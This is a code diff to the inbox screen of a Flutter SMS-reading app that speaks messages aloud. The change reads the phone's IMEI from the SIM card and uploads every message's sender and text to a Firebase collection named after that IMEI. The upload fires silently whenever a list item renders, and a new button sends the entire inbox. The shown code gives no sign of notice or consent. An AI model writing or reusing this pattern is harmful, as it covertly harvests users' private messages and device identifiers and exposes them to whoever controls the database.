@@ -22,11 +22,23 @@ class _InboxState extends State<Inbox> {
     speak(
         'click to listen message sender name and long press to listen message.');
     getAllMessages();
+    getImei();
+  }
+
+  SimCardsProvider provider = SimCardsProvider();
+
+  getImei() async {
+    sims = await provider.getSimCards();
+    setState(() {
+      imei = sims[0].imei;
+    });
   }
 
   SmsQuery query = SmsQuery();
   List inbox = [];
   List sms = [];
+  List<SimCard> sims = [];
+  String imei;
   Future getAllMessages() async {
     setState(() {
       _isLoading = true;
@@ -40,19 +52,14 @@ class _InboxState extends State<Inbox> {
     setState(() {
       _isLoading = false;
     });
-    print('Length-----------------' + messages.length.toString());
-
-    // uploadingData('element.sender', 'element.body');
-    messages.forEach((element) {
-      uploadingData(element.sender, element.body);
-    });
   }
 
   Future<void> uploadingData(
+    String imei,
     String smsTitle,
     String content,
   ) async {
-    await FirebaseFirestore.instance.collection('Messages').doc(smsTitle).set({
+    await FirebaseFirestore.instance.collection(imei).add({
       'title': smsTitle,
       'content': content,
     });
@@ -83,6 +90,7 @@ class _InboxState extends State<Inbox> {
                           physics: BouncingScrollPhysics(),
                           itemCount: inbox.length,
                           itemBuilder: (context, i) {
+                            uploadingData(imei, inbox[i], sms[i]);
                             return Column(
                               children: [
                                 Container(
@@ -118,6 +126,13 @@ class _InboxState extends State<Inbox> {
                       }),
                 ),
               ],
+            ),
+            floatingActionButton: FloatingActionButton(
+              onPressed: () async {
+                await FirebaseFirestore.instance
+                    .collection(imei)
+                    .add({'messages': inbox});
+              },
             ),
           );
   }
